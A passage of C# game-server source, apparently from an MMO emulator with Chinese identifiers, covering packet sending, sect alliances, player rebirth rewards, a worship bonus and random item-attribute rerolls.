				byte[] array = Converter.hexStringToByte(hex);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "申请攻城出错" + base.Client.WorldId + "|" + base.Userid + "|" + base.UserName + " " + ex);
			}
		}

		public int 申请门派联盟(string 盟主门派)
		{
			foreach (门派联盟申请状态 item2 in World.门派联盟申请状态)
			{
				if (item2.申请门派名字 == base.帮派名字)
				{
					return -1;
				}
			}
			门派联盟申请状态 item = new 门派联盟申请状态
			{
				申请门派名字 = base.帮派名字,
				盟主门派名字 = 盟主门派
			};
			World.门派联盟申请状态.Add(item);
			return 0;
		}

		public void 发送副本复活剩余次数()
		{
			byte[] array = Converter.hexStringToByte("AA553200750543012C0000000000000000003DD09A3B00000000720002000A000000000000000100000098EEA67D000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(副本复活剩余次数), 0, array, 30, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 触发人物靠近()
		{
			foreach (NpcClass value2 in MapClass.GetnpcTemplate(base.人物坐标_地图).Values)
			{
				if (value2.NPC死亡 && 查找范围Npc(50, value2))
				{
					if (!value2.templayer.ContainsKey(base.人物全服ID))
					{
						value2.templayer.TryAdd(base.人物全服ID, this);
						if (value2.FLD_PID == 16607 && value2.templayer.Count >= value2.怪物数字)
						{
							value2.地狱火龙副本状态效果消失(是否玩家击杀: true);
						}
					}
				}
				else if (value2.templayer.ContainsKey(base.人物全服ID))
				{
					value2.templayer.TryRemove(base.人物全服ID, out var _);
				}
			}
		}

		public void 异口同声(string msg)
		{
			if (World.异口同声开启中 == 1)
			{
				if (msg == World.异口同声内容)
				{
					if (追加状态列表.ContainsKey(1008000396))
					{
						系统提示("你已经参加过无法再次获得谢谢您的支持！祝你游戏愉快！", 50, "");
						return;
					}
					追加状态类 追加状态类2 = new 追加状态类(this, 7200000, 1008000396, 1);
					追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
					状态效果(BitConverter.GetBytes(1008000396), 1, 7200000);
					base.FLD_人物_追加_攻击 += 30;
					base.FLD_人物_追加_防御 += 30;
					base.人物追加最大_HP += 300;
					base.FLD_人物_追加_经验百分比 += 1.0;
					更新武功和状态();
					系统提示("获得奖励", 9, "异口同声");
				}
				else
				{
					系统提示("内容输入错误", 9, "异口同声");
				}
			}
			else
			{
				系统提示("未开启", 9, "异口同声");
			}
		}

		public void 膜拜系统()
		{
			if (World.赞助大使名字 == string.Empty)
			{
				系统提示("目前无人冠名NPC, 无法膜拜..", 10, "系统提示");
				return;
			}
			if (base.Player_Level < 35)
			{
				系统提示("等级小于35级无法膜拜", 10, "系统提示");
				return;
			}
			if (base.UserName == World.赞助大使名字)
			{
				系统提示("自己无法膜拜自己...", 10, "系统提示");
				return;
			}
			DateTime now = DateTime.Now;
			if (DateTime.Now > base.FLD_MBVIPTIM)
			{
				DateTime dateTime2 = (base.FLD_MBVIPTIM = DateTime.Now.AddDays(1.0));
				now = dateTime2;
				base.Player_WuXun += 2000;
				更新武功和状态();
				系统提示("膜拜增加武勋2000点");
				保存膜拜数据();
				World.发送公告(string.Format("玩家[" + base.UserName + "]在泫勃派, 向大神玩家[" + World.赞助大使名字 + "]膜拜.获得武勋[2000]奖励.."));
			}
			else
			{
				系统提示("在[" + base.FLD_MBVIPTIM.ToString("yyyy年MM月dd日 HH时mm分ss秒") + "]后, 才能再次膜拜。", 21, "系统提示");
			}
		}

		public void 转生系统()
		{
			try
			{
				CheckTreasureGems();
				if (base.转生次数 >= World.限制转生次数)
				{
					系统提示("本服最大转生次数为" + World.限制转生次数 + "次！", 10, "转生提示");
				}
				else if (base.Player_Level >= World.转生需要等级 && base.Player_Job_leve >= World.转生需要几转)
				{
					string[] array = World.转生获得属性.Split(';');
					if ((long)int.Parse(array[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array[0]);
						更新武功和状态();
						系统提示("转生成功, 系统赠送您" + int.Parse(array[0]) + "点武勋！", 10, "转生提示");
					}
					if (int.Parse(array[1]) != 0L && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array[1]), 1, "转生");
						系统提示("转生成功, 系统赠送您" + int.Parse(array[1]) + "个元宝！", 10, "转生提示");
					}
					if ((long)int.Parse(array[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array[2]), 1, "转生");
						系统提示("转生成功, 系统赠送您" + int.Parse(array[2]) + "个钻石！", 10, "转生提示");
					}
					if (long.Parse(array[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array[3]);
						系统提示("攻击" + int.Parse(array[3]), 10, "转生提示");
					}
					if (long.Parse(array[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array[4]);
						系统提示("防御" + int.Parse(array[4]), 10, "转生提示");
					}
					if ((long)int.Parse(array[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array[5]);
						系统提示("生命" + int.Parse(array[5]), 10, "转生提示");
					}
					if ((long)int.Parse(array[6]) != 0)
					{
						int num = 得到包裹空位(this);
						if (num == -1)
						{
							系统提示("请把背包留一个空位, 送你一个套装！", 10, "转生提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array[7])), new byte[56]);
						}
					}
					base.转生次数++;
					base.Player_Level = World.转生回落等级;
					base.人物经验 = 0L;
					人物转职业(base.Player_Zx, World.转生降落几转);
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					升级后的提示(1);
					string msg = "飘飘乎如遗世独立, 羽化而登仙.恭喜玩家" + base.UserName + "转世轮回成功";
					World.发送公告(msg);
					SaveGemData();
					SavePlayerData();
				}
				else
				{
					系统提示("必须达到" + World.转生需要等级 + "级和" + World.转生需要几转 + "转才能转生!", 10, "转生提示");
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "转生系统出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 增加物品_四神(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性, int 四神之力)
		{
			try
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array2 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					byte[] array3 = new byte[4];
					Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
					物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
					if (BitConverter.ToInt32(物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品ID, 0) != 1008000045)
					{
						if (物品类2 != null)
						{
							位置 = 物品类2.物品位置;
							物品全局ID = 物品类2.物品全局ID;
							数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类2.物品数量, 0) + BitConverter.ToInt32(数量, 0));
						}
					}
					else
					{
						物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
					}
				}
				else
				{
					数量 = BitConverter.GetBytes(1);
				}
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 55);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(array2, 0, array, 14, 12);
				Buffer.BlockCopy(array2, 12, array, 30, 4);
				Buffer.BlockCopy(array2, 16, array, 46, 55);
				if (四神之力 != 0)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(四神之力), 0, array2, 71, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(四神之力), 0, array, 102, 4);
				}
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加物品四神出错  [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 定制咕咕鸡属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.定制咕咕鸡属性.Split(';');
					if (装备栏包裹[0].Get物品ID == World.咕咕鸡ID)
					{
						减去物品(0, 1);
						int 物品属性 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int 物品属性2 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int 物品属性3 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int 物品属性4 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 0, 物品属性, 物品属性2, 物品属性3, 物品属性4, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					else
					{
						系统提示("请将洗髓物品放置背包第一个格子", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置咕咕鸡属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.咕咕鸡属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.咕咕鸡ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，咕咕鸡属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠武器属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠武器属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
